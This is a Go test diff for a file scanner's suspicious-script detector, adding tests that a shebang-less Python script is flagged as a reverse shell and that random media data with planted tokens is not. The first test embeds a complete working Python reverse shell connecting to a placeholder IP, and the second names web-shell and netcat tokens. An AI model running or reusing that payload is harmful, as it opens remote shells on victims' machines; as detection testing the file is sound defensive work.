@@ -2,6 +2,7 @@ package scanner_test
 
 import (
 	"bytes"
+	"math/rand"
 	"os"
 	"strings"
 	"testing"
@@ -826,5 +827,79 @@ func TestCheckAllSuspiciousScriptContent_BenignBinaryNoFalsePositive(t *testing.
 	matchesDat := scanner.CheckAllSuspiciousScriptContent("/var/www/cache.dat", benignData, nil, cfg)
 	if len(matchesDat) != 0 {
 		t.Errorf("expected 0 matches for benign cache.dat, got %d matches", len(matchesDat))
+	}
+}
+
+func TestCheckAllSuspiciousScriptContent_ShebanglessPythonReverseShell(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Shebang-less Python reverse shell in a non-volatile user directory (/home/nick/tool.py or /home/nick/exploit.txt)
+	// Must be detected via text-likeness ratio without needing a shebang or volatile path prefix.
+	pyPayload := []byte("import socket, os, pty\n" +
+		"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
+		"s.connect(('10.10.10.10', 9001))\n" +
+		"os.dup2(s.fileno(), 0)\n" +
+		"os.dup2(s.fileno(), 1)\n" +
+		"os.dup2(s.fileno(), 2)\n" +
+		"pty.spawn('/bin/sh')\n")
+
+	for _, path := range []string{"/home/nick/tool.py", "/home/nick/exploit.txt", "/opt/app/worker.py"} {
+		matches := scanner.CheckAllSuspiciousScriptContent(path, pyPayload, nil, cfg)
+		if len(matches) == 0 {
+			t.Fatalf("expected shebang-less python script at %s to be detected, got 0 matches", path)
+		}
+		if matches[0].Name != "Script_Reverse_Shell_Inline" {
+			t.Errorf("path %s: expected Script_Reverse_Shell_Inline, got %s", path, matches[0].Name)
+		}
+	}
+}
+
+func TestCheckAllSuspiciousScriptContent_MediaCorpusNoFalseTriggers(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Simulate 4MB compressed media buffers (JPEGs, ZIPs, MP3s) with random high-entropy bytes.
+	// Even if benign 3-4 byte substrings like "nc ", "wso", "c99", "r57" appear by chance,
+	// context gating (outside volatile paths) and text-likeness ratio (<85% printable) must
+	// guarantee zero false positive candidate triggers.
+	rng := rand.New(rand.NewSource(42))
+	mediaBuf := make([]byte, 4*1024*1024)
+	rng.Read(mediaBuf)
+
+	// Embed collision tokens that used to cause 20% fallthrough on old token prefilters
+	copy(mediaBuf[100:103], []byte("nc "))
+	copy(mediaBuf[200:203], []byte("wso"))
+	copy(mediaBuf[300:303], []byte("c99"))
+	copy(mediaBuf[400:403], []byte("r57"))
+
+	testPaths := []string{
+		"/home/user/Pictures/vacation.jpg",
+		"/home/user/Downloads/archive.zip",
+		"/home/user/Music/track.mp3",
+		"/tmp/backup.zip", // volatile path, but low text-likeness and no 8-byte attack tokens
+	}
+
+	for _, path := range testPaths {
+		matches := scanner.CheckAllSuspiciousScriptContent(path, mediaBuf, nil, cfg)
+		if len(matches) != 0 {
+			t.Errorf("expected 0 matches for media file %s, got %d matches: %+v", path, len(matches), matches)
+		}
+	}
+}
+
+func BenchmarkScanMediaAssets_NoFalseTriggers(b *testing.B) {
+	cfg := config.NewDefaultConfig()
+	mediaBuf := make([]byte, 4*1024*1024)
+	for i := range mediaBuf {
+		mediaBuf[i] = byte(i * 31 % 256)
+	}
+	path := "/home/user/Pictures/large_photo.jpg"
+
+	b.ResetTimer()
+	b.ReportAllocs()
+	for i := 0; i < b.N; i++ {
+		matches := scanner.CheckAllSuspiciousScriptContent(path, mediaBuf, nil, cfg)
+		if len(matches) != 0 {
+			b.Fatalf("unexpected match in benchmark: %+v", matches)
+		}
 	}
 }
